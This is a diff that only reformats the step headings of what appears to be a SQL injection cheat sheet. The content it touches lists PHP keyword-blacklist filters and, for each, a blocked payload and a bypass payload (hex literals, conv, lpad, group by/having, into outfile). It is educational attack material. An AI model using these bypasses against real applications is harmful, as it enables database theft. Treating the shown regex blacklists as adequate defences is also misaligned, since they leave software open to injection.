@@ -1248,38 +1248,38 @@ __Method:__
 
 __Techniques:__
 
-##### Step 1:
+##### • Step 1:
 __Keyword filer__: `and`, `or`, `union`  
 __Possible PHP Filter Code__: `preg_match('/(and|or|union)/i', $id)`
 - __Filtered Injection__: `union select user, password from users`
 - __Bypassed Injection__: `1 || (select user from users where user_id = 1) = 'admin'`
 
-##### Step 2:
+##### • Step 2:
 __Keyword filer__: `and`, `or`, `union`, `where`  
 __Possible PHP Filter Code__: `preg_match('/(and|or|union|where)/i', $id)`
 - __Filtered Injection__: `1 || (select user from users where user_id = 1) = 'admin'`
 - __Bypassed Injection__: `1 || (select user from users limit 1) = 'admin'`
 
-##### Step 3:
+##### • Step 3:
 __Keyword filer__: `and`, `or`, `union`, `where`, `limit`  
 __Possible PHP Filter Code__: `preg_match('/(and|or|union|where|limit)/i', $id)`
 - __Filtered Injection__: `1 || (select user from users limit 1) = 'admin'`
 - __Bypassed Injection__: `1 || (select user from users group by user_id having user_id = 1) = 'admin'`
 
-##### Step 4:
+##### • Step 4:
 __Keyword filer__: `and`, `or`, `union`, `where`, `limit`, `group by`  
 __Possible PHP Filter Code__: `preg_match('/(and|or|union|where|limit|group by)/i', $id)`
 - __Filtered Injection__: `1 || (select user from users group by user_id having user_id = 1) = 'admin'`
 - __Bypassed Injection__: `1 || (select substr(group_concat(user_id),1,1) user from users ) = 1`
 
-##### Step 5:
+##### • Step 5:
 __Keyword filer__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`  
 __Possible PHP Filter Code__:    `preg_match('/(and|or|union|where|limit|group by|select)/i', $id)`
 - __Filtered Injection__: `1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1`
 - __Bypassed Injection__: `1 || 1 = 1 into outfile 'result.txt'`
 - __Bypassed Injection__: `1 || substr(user,1,1) = 'a'`
 
-##### Step 6:
+##### • Step 6:
 __Keyword filer__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`  
 __Possible PHP Filter Code__: `preg_match('/(and|or|union|where|limit|group by|select|\')/i', $id)`
 - __Filtered Injection__: `1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1`
@@ -1287,19 +1287,19 @@ __Possible PHP Filter Code__: `preg_match('/(and|or|union|where|limit|group by|s
 - __Bypassed Injection__: `1 || substr(user,1,1) = 0x61`
 - __Bypassed Injection__: `1 || substr(user,1,1) = unhex(61)`
 
-##### Step 7:
+##### • Step 7:
 __Keyword filer__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`, `hex`  
 Possible __Possible PHP Filter Code__:    `preg_match('/(and|or|union|where|limit|group by|select|\'|hex)/i', $id)`
 - __Filtered Injection__: `1 || substr(user,1,1) = unhex(61)`
 - __Bypassed Injection__: `1 || substr(user,1,1) = lower(conv(11,10,36))`
 
-##### Step 8:
+##### • Step 8:
 __Keyword filer__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`, `hex`, `substr`  
 __Possible PHP Filter Code__:    `preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr)/i', $id)`
 - __Filtered Injection__: `1 || substr(user,1,1) = lower(conv(11,10,36))`
 - __Bypassed Injection__: `1 || lpad(user,7,1)`
 
-##### Step 9:
+##### • Step 9:
 __Keyword filer__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`, `hex`, `substr`, `white space`  
 __Possible PHP Filter Code__:    `preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr|\s)/i', $id)`
 - __Filtered Injection__: `1 || lpad(user,7,1)`
